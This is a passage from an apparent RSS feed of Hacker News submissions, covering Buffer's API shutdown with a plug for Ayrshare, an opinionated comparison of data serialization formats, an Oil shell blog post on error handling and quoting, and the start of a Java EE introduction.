<p>In <a href="https://techcrunch.com/2012/08/01/social-media-manager-buffer-opens-api-to-developers-looks-to-become-widespread-sharing-standard/">7 short years</a>, or maybe long years in tech, <a href="https://www.buffer.com/">Buffer</a> went from offering and API to getting rid of it.</p>



<p>So what happened?</p>



<p>Based on the <a href="https://blog.loomly.com/buffer-integration-sunset/">email</a> Loomly got from Buffer, it at first looks like Buffer got in trouble with the social networks:</p>



<blockquote><p>We’ve determined that we can no longer permit certain usage of the Buffer API, especially when the posting goes beyond the stated agreements we have with the social networks.</p></blockquote>



<p>Ok, but simple abuse of posting happens whether manual or automatic. And you can build in safeguards, thresholds, and other protection mechanisms. </p>



<p>And then we come to:</p>



<blockquote><p>After an audit of existing API integrations, we’ve chosen to revoke access to third-party tools that&nbsp;provide similar functionality to Buffer’s core product, i.e. scheduling social media posts directly via&nbsp;social network&nbsp;APIs. These products can no longer utilize&nbsp;the Buffer&nbsp;API.</p></blockquote>



<p>Ah ha! Companies that essentially used Buffer as a proxy to post were no longer wanted as Buffer seemed to narrow its focus to media agencies. In this context, such a strategy to de-emphasize the API makes sense. After all, most agencies have teams of people creating content and manually scheduling and posting all day long.</p>



<p>It is a shame that Buffer dropped their API since there is a <a href="https://ayrshare.positorgroup.com/top-10-social-media-apis-for-developers/">shortage</a> of good solutions out there and it really is needed if you want to automated your social media. </p>



<p>This is the reason we created <a href="https://ayrshare.positorgroup.com/">Ayrshare</a>. We built it first for ourselves and then for users to automate posting to social media networks via an API. </p>



<p>So in a way, thanks Buffer!</p>




	</div>
</div></div>]]>
            </description>
            <link>https://www.ayrshare.com/what-happened-to-buffers-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872153</guid>
            <pubDate>Fri, 23 Oct 2020 18:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Better Than JSON?]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 138 (<a href="https://news.ycombinator.com/item?id=24871946">thread link</a>) | @fanf2
<br/>
October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wiki.alopex.li/BetterThanJson">https://wiki.alopex.li/BetterThanJson</a></em></p>]]>
            </description>
            <link>https://wiki.alopex.li/BetterThanJson</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871946</guid>
            <pubDate>Fri, 23 Oct 2020 17:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four features that justify a new Unix shell]]>
            </title>
            <description>
<![CDATA[
Score 207 | Comments 142 (<a href="https://news.ycombinator.com/item?id=24871762">thread link</a>) | @diegocg
<br/>
October 23, 2020 | http://www.oilshell.org/blog/2020/10/osh-features.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/osh-features.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>
<ul>
<li>Related: Posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=escaping-quoting#escaping-quoting">escaping-quoting</a>, particularly <a href="http://www.oilshell.org/blog/2017/09/29.html">Git Log
in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>
<p>If you haven't read it already, see <a href="http://www.oilshell.org/blog/2018/01/28.html">Why Create a Unix
Shell?</a>.  It's the most popular page on this site,
though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>
<a name="dev-tools-improvements"></a>
<h3>Dev Tools Improvements</h3>
<p>Speaking of which, several people have pointed out that the dev process for Oil
is difficult.  I've addressed this recently by removing spew from …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">http://www.oilshell.org/blog/2020/10/osh-features.html</a></em></p>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/osh-features.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871762</guid>
            <pubDate>Fri, 23 Oct 2020 17:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Complete Introduction to Java EE]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24871754">thread link</a>) | @jessym
<br/>
October 23, 2020 | https://www.jessym.com/articles/a-complete-introduction-to-java-ee | <a href="https://web.archive.org/web/*/https://www.jessym.com/articles/a-complete-introduction-to-java-ee">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- TODO -->
<!-- Once Jakarta EE 9 is officially released (and WildFly 21 supports it): -->
<!-- DUPLICATE this article so you have two articles - one for Java EE and one for Jakarta EE: -->
<!-- Bring the new Jakarta EE article up to date as follows: -->
<!-- * Update all titles to: 'A Thorough Introduction to Jakarta EE (Formerly Known as Java EE) -->
<!-- * Update poster image -->
<!-- * Update WildFly + Java version -->
<!-- * Update GitHub project to use the Jakarta EE 9 platform API -->
<!-- * Update article introduction to write something about the Java EE / Jakarta EE naming situation -->
<!-- * Update article references to new GiHub repository folder -->
<!-- * Update article text references from Java EE (8) to Jakarta EE (9) -->
<!-- * Update article code snippet package references from javax.* to jakarta.* -->
<!-- * Update specifications like "Java API for RESTful Web Services" to "Jakarta RESTful Web Services" -->

<p>The two most popular Java frameworks for server-side application development are <strong>Java EE</strong> (<em>Enterprise Edition</em>) and <strong>Spring</strong>.
Java EE is the <em>official</em> specification,
whereas Spring (unofficially) describes pretty much the same functionality,
but in many cases does so in a slightly different, often easier way.</p>
<p>(Later on, we'll go into greater detail about what the Java EE specification <em>is</em>, and what the term actually means.)</p>
<p>Should you use Java EE for your next projects, then? No, probably not.
Because what's important to know about Java EE, is that it's a comparatively heavy framework,
in terms of both setup and actually running it (in production).
The Java EE framework has greatly improved over the last decade,
but in terms of documentation, ease-of-use and operational simplicity,
it still doesn't match up against <a href="https://spring.io/projects/spring-boot">Spring Boot</a>.</p>
<p>Becoming knowledgeable in Java EE can still be worthwile, though.
For example, if you're looking to expand your software consultancy services to enterprise clients.
The <em>EE</em> part of Java EE (Enterprise Edition) is still very fitting,
as the framework is still almost exclusively used by the enterprises and BigCo's like
